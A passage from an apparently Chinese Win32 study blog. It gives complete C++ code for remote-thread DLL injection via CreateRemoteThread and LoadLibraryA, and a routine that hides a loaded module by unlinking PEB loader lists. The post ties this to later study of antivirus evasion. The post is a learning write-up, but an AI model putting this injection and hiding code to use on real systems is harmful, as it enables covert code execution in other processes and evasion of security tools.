class="keyword">char</span>* argv[])</span> </span>&#123;</span><br><span class="line">    </span><br><span class="line">    HANDLE hThread = <span class="built_in">CreateThread</span>(<span class="literal">NULL</span>, <span class="literal">NULL</span>, ThreadProc, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">CloseHandle</span>(hThread);</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">getchar</span>();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>B:执行的远程线程的线程函数地址应该是在别的进程中存在的</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">MyCreateRemoteThread</span><span class="params">(DWORD dwProcessId, DWORD dwProcessAddr)</span> </span>&#123;</span><br><span class="line">    DWORD dwThreadId;</span><br><span class="line">    HANDLE hProcess;</span><br><span class="line">    HANDLE hThread;</span><br><span class="line">    <span class="comment">// 1. 获取进程句柄</span></span><br><span class="line">    hProcess = <span class="built_in">OpenProcess</span>(PROCESS_ALL_ACCESS, FALSE, dwProcessId);</span><br><span class="line">    <span class="comment">// 判断OpenProcess是否执行成功</span></span><br><span class="line">    <span class="keyword">if</span> (hProcess == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">OutputDebugString</span>(<span class="built_in">TEXT</span>(<span class="string">&quot;OpenProcess failed! \n&quot;</span>));</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 2. 创建远程线程</span></span><br><span class="line">    hThread = <span class="built_in">CreateRemoteThread</span>(</span><br><span class="line">        hProcess,                          <span class="comment">// handle to process</span></span><br><span class="line">        <span class="literal">NULL</span>, <span class="comment">// SD</span></span><br><span class="line">        <span class="number">0</span>,                       <span class="comment">// initial stack size</span></span><br><span class="line">        (LPTHREAD_START_ROUTINE)dwProcessAddr,    <span class="comment">// thread function</span></span><br><span class="line">        <span class="literal">NULL</span>,                       <span class="comment">// thread argument</span></span><br><span class="line">        <span class="number">0</span>,                    <span class="comment">// creation option</span></span><br><span class="line">        &amp;dwThreadId                        <span class="comment">// thread identifier</span></span><br><span class="line">    );</span><br><span class="line">    <span class="comment">// 判断CreateRemoteThread是否执行成功</span></span><br><span class="line">    <span class="keyword">if</span> (hThread == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">OutputDebugString</span>(<span class="built_in">TEXT</span>(<span class="string">&quot;CreateRemoteThread failed! \n&quot;</span>));</span><br><span class="line">        <span class="built_in">CloseHandle</span>(hProcess);</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 3. 关闭</span></span><br><span class="line">    <span class="built_in">CloseHandle</span>(hThread);</span><br><span class="line">    <span class="built_in">CloseHandle</span>(hProcess);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 返回</span></span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>成功执行！</p><figure><img src="/2022/04/01/%E9%87%8D%E6%8B%BEWin32/image-20220405121345946.png" alt="image-20220405121345946"><figcaption aria-hidden="true">image-20220405121345946</figcaption></figure><h1 id="远程线程注入">远程线程注入</h1><p>如果我们想要创建远程线程调用自己定义的线程函数就需要使用<strong>远程线程注入</strong>技术。</p><h2 id="什么是注入">什么是注入</h2><p>所谓注入就是在第三方进程不知道或者不允许的情况下将模块或者代码写入对方进程空间，并设法执行的技术。</p><p>在安全领域，“注入”是非常重要的一种技术手段，注入与反注入也一直处于不断变化的，而且也愈来愈激烈的对抗当中。</p><p><strong>已知的注入方式：</strong></p><p>远程线程注入、APC注入、消息钩子注入、注册表注入、导入表注入、输入法注入等等。</p><h2 id="远程线程注入的流程">远程线程注入的流程</h2><p>远程线程注入的思路就是在进程A中创建线程，<strong>将线程函数指向LoadLibrary函数</strong>。</p><p>那么为什么可以这样呢？这是因为我们执行远程线程函数满足返回值是4字节，一个参数是4字节即可（ThreadProc就是这样的条件）：</p><p>重新写个dll：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function">DWORD WINAPI <span class="title">ThreadProc</span><span class="params">(LPVOID lpParaneter)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">10</span>;i++) &#123;</span><br><span class="line">        <span class="built_in">Sleep</span>(<span class="number">1000</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;DLL RUNNING...&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">BOOL APIENTRY <span class="title">DllMain</span><span class="params">(HANDLE hModule,</span></span></span><br><span class="line"><span class="params"><span class="function">    DWORD  ul_reason_for_call,</span></span></span><br><span class="line"><span class="params"><span class="function">    LPVOID lpReserved</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span></span><br><span class="line"><span class="function"></span>&#123;   <span class="comment">// 当进程执行LoadLibrary时创建一个线程，执行ThreadProc线程</span></span><br><span class="line">    <span class="built_in"><span class="keyword">switch</span></span> (ul_reason_for_call) &#123;</span><br><span class="line">    <span class="keyword">case</span> DLL_PROCESS_ATTACH:</span><br><span class="line">        <span class="built_in">CreateThread</span>(<span class="literal">NULL</span>, <span class="number">0</span>, ThreadProc, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>被注入的程序还是和之前那个一样，下面是注入的程序：（这里我搞了半天，最后还是32位的成功了。。。）</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// LoadDll需要两个参数一个参数是进程ID，一个是DLL文件的路径</span></span><br><span class="line"><span class="function">BOOL <span class="title">LoadDll</span><span class="params">(DWORD dwProcessID, <span class="keyword">char</span>* szDllPathName)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    BOOL bRet;</span><br><span class="line">    HANDLE hProcess;</span><br><span class="line">    HANDLE hThread;</span><br><span class="line">    DWORD dwLength;</span><br><span class="line">    DWORD dwLoadAddr;</span><br><span class="line">    LPVOID lpAllocAddr;</span><br><span class="line">    DWORD dwThreadID;</span><br><span class="line">    HMODULE hModule;</span><br><span class="line"></span><br><span class="line">    bRet = <span class="number">0</span>;</span><br><span class="line">    dwLoadAddr = <span class="number">0</span>;</span><br><span class="line">    hProcess = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 1. 获取进程句柄</span></span><br><span class="line">    hProcess = <span class="built_in">OpenProcess</span>(PROCESS_ALL_ACCESS, FALSE, dwProcessID);</span><br><span class="line">    <span class="keyword">if</span> (hProcess == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">OutputDebugString</span>(<span class="built_in">TEXT</span>(<span class="string">&quot;OpenProcess failed! \n&quot;</span>));</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 2. 获取DLL文件路径的长度，并在最后+1，因为要加上0结尾的长度</span></span><br><span class="line">    dwLength = <span class="built_in">strlen</span>(szDllPathName) + <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 3. 在目标进程分配内存</span></span><br><span class="line">    lpAllocAddr = <span class="built_in">VirtualAllocEx</span>(hProcess, <span class="literal">NULL</span>, dwLength, MEM_COMMIT, PAGE_READWRITE);</span><br><span class="line">    <span class="keyword">if</span> (lpAllocAddr == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">OutputDebugString</span>(<span class="built_in">TEXT</span>(<span class="string">&quot;VirtualAllocEx failed! \n&quot;</span>));</span><br><span class="line">        <span class="built_in">CloseHandle</span>(hProcess);</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 4. 拷贝DLL路径名字到目标进程的内存</span></span><br><span class="line">    bRet = <span class="built_in">WriteProcessMemory</span>(hProcess, lpAllocAddr, szDllPathName, dwLength, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">if</span> (!bRet) &#123;</span><br><span class="line">        <span class="built_in">OutputDebugString</span>(<span class="built_in">TEXT</span>(<span class="string">&quot;WriteProcessMemory failed! \n&quot;</span>));</span><br><span class="line">        <span class="built_in">CloseHandle</span>(hProcess);</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 5. 获取模块句柄</span></span><br><span class="line">    <span class="comment">// LoadLibrary这个函数是在kernel32.dll这个模块中的，所以需要现货区kernel32.dll这个模块的句柄</span></span><br><span class="line">    hModule = <span class="built_in">GetModuleHandle</span>(<span class="built_in">TEXT</span>(<span class="string">&quot;kernel32.dll&quot;</span>));</span><br><span class="line">    <span class="keyword">if</span> (!hModule) &#123;</span><br><span class="line">        <span class="built_in">OutputDebugString</span>(<span class="built_in">TEXT</span>(<span class="string">&quot;GetModuleHandle failed! \n&quot;</span>));</span><br><span class="line">        <span class="built_in">CloseHandle</span>(hProcess);</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 6. 获取LoadLibraryA函数地址</span></span><br><span class="line">    dwLoadAddr = (DWORD)<span class="built_in">GetProcAddress</span>(hModule, <span class="string">&quot;LoadLibraryA&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (!dwLoadAddr) &#123;</span><br><span class="line">        <span class="built_in">OutputDebugString</span>(<span class="built_in">TEXT</span>(<span class="string">&quot;GetProcAddress failed! \n&quot;</span>));</span><br><span class="line">        <span class="built_in">CloseHandle</span>(hModule);</span><br><span class="line">        <span class="built_in">CloseHandle</span>(hProcess);</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 7. 创建远程线程，加载DLL</span></span><br><span class="line">    hThread = <span class="built_in">CreateRemoteThread</span>(hProcess, <span class="literal">NULL</span>, <span class="number">0</span>, (LPTHREAD_START_ROUTINE)dwLoadAddr, lpAllocAddr, <span class="number">0</span>, &amp;dwThreadID);</span><br><span class="line">    <span class="keyword">if</span> (!hThread) &#123;</span><br><span class="line">        <span class="built_in">OutputDebugString</span>(<span class="built_in">TEXT</span>(<span class="string">&quot;CreateRemoteThread failed! \n&quot;</span>));</span><br><span class="line">        <span class="built_in">CloseHandle</span>(hModule);</span><br><span class="line">        <span class="built_in">CloseHandle</span>(hProcess);</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 8. 关闭进程句柄</span></span><br><span class="line">    <span class="built_in">CloseHandle</span>(hThread);</span><br><span class="line">    <span class="built_in">CloseHandle</span>(hProcess);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">LoadDll</span>(<span class="number">27220</span>, (<span class="keyword">char</span>*)<span class="string">&quot;E:\\github\\Win32LearnCode\\Code\\lesson28\\MyDLL\\Debug\\MyDLL.dll&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>成功注入！！！</p><figure><img src="/2022/04/01/%E9%87%8D%E6%8B%BEWin32/image-20220405181829457.png" alt="image-20220405181829457"><figcaption aria-hidden="true">image-20220405181829457</figcaption></figure><h1 id="模块隐藏">模块隐藏</h1><h2 id="模块隐藏-断链">模块隐藏-断链</h2><p>API是从这几个结构体（<strong>结构体属于3环应用层</strong>）中查询出来的：</p><ol type="1"><li>TEB(Thread Environment Block，线程环境块)，它存放线程的相关信息，每一个线程都有自己的TEB信息，FS:[0]即是当前线程的TEB。</li><li>PEB(Process Environment Block，进程环境块)，它存放进程的相关信息，每个进程都有自己的PEB信息，FS:[0x30]即当前进程的PEB。</li></ol><p>如下图所示（只介绍与本章节相关的信息）</p><ol type="1"><li>TEB第一个成员是一个结构体，这个结构体包含了当前线程栈栈底和当前线程栈的界限；TEB的<strong>020</strong>偏移是一个结构体，其包含了两个成员，一个是当前线程所在进程的PID和当前线程自己的线程ID；</li><li>PEB的<strong>00c</strong>偏移是一个结构体，这个结构体包括<strong>模块链表</strong>，API函数遍历模块就是查看这个链表。</li></ol><p><img src="/2022/04/01/%E9%87%8D%E6%8B%BEWin32/image2021-6-3_22-31-12.png"></p><p>FS寄存器中存储的就是当前正在使用的线程的TEB结构体的地址。</p><p>PEB结构体同理，我们只需要找到FS寄存器中存储地址的0x30偏移然后跟进即可</p><p>代码实现：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">HideModule</span><span class="params">(<span class="keyword">char</span>* szModuleName)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 获取模块的句柄</span></span><br><span class="line">    HMODULE hMod = <span class="built_in">GetModuleHandle</span>(szModuleName);</span><br><span class="line">    PLIST_ENTRY Head, Cur;</span><br><span class="line">    PPEB_LDR_DATA ldr;</span><br><span class="line">    PLDR_MODULE ldmod;</span><br><span class="line">    </span><br><span class="line">    __asm &#123;</span><br><span class="line">        mov eax, fs:[<span class="number">0x30</span>] <span class="comment">// 取PEB结构体</span></span><br><span class="line">            mov ecx, [eax + <span class="number">0x0c</span>] <span class="comment">// 取PEB结构体的00c偏移的结构体，就是PEB_LDR_DATA</span></span><br><span class="line">            mov ldr, ecx <span class="comment">// 将ecx给到ldr</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 获取正在加载的模块列表</span></span><br><span class="line">    Head = &amp;(ldr-&gt;InLoadOrderModuleList);</span><br><span class="line">    <span class="comment">// </span></span><br><span class="line">    Cur = Head-&gt;Flink;</span><br><span class="line">    <span class="keyword">do</span> &#123;</span><br><span class="line">        <span class="comment">// 宏CONTAINING_RECORD根据结构体中某成员的地址来推算出该结构体整体的地址</span></span><br><span class="line">        ldmod = <span class="built_in">CONTAINING_RECORD</span>(Cur, LDR_MODULE, InLoadOrderModuleList);</span><br><span class="line">        <span class="comment">// 循环遍历，如果地址一致则表示找到对应模块来，就进行断链</span></span><br><span class="line">        <span class="keyword">if</span>(hMod == ldmod-&gt;BaseAddress) &#123;</span><br><span class="line">            <span class="comment">// 断链原理很简单就是将属性交错替换</span></span><br><span class="line">            ldmod-&gt;InLoadOrderModuleList.Blink-&gt;Flink = ldmod-&gt;InLoadOrderModuleList.Flink;</span><br><span class="line">            ldmod-&gt;InLoadOrderModuleList.Flink-&gt;Blink = ldmod-&gt;InLoadOrderModuleList.Blink;</span><br><span class="line">            </span><br><span class="line">            ldmod-&gt;InInitializationOrderModuleList.Blink-&gt;Flink = ldmod-&gt;InInitializationOrderModuleList.Flink;</span><br><span class="line">            ldmod-&gt;InInitializationOrderModuleList.Flink-&gt;Blink = ldmod-&gt;InInitializationOrderModuleList.Blink;</span><br><span class="line">            </span><br><span class="line">            ldmod-&gt;InMemoryOrderModuleList.Blink-&gt;Flink = ldmod-&gt;InMemoryOrderModuleList.Flink;</span><br><span class="line">            ldmod-&gt;InMemoryOrderModuleList.Flink-&gt;Blink = ldmod-&gt;InMemoryOrderModuleList.Blink;</span><br><span class="line">        &#125;</span><br><span class="line">        Cur = Cur-&gt;Flink;</span><br><span class="line">    &#125; <span class="keyword">while</span> (Head != Cur);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;之后想看看免杀和内核相关的东西，先把win32再看一遍吧，好多都忘了，还是滴水的课程，感谢海哥的课程！&lt;/p&gt;
&lt;p&gt;[toc]&lt;/p&gt;
&lt;h1 id=&quot;介绍&quot;&gt;介绍&lt;/h1&gt;
&lt;p&gt;Win32不是用来画界面的，如果你以后要在Windows写好程序，是必须要学Win3</summary>
      
    
    
    
    <category term="Technology" scheme="https://ghostasky.github.io/categories/Technology/"/>
    
    
    <category term="Win32" scheme="https://ghostasky.github.io/tags/Win32/"/>
    
  </entry>
  
</feed>
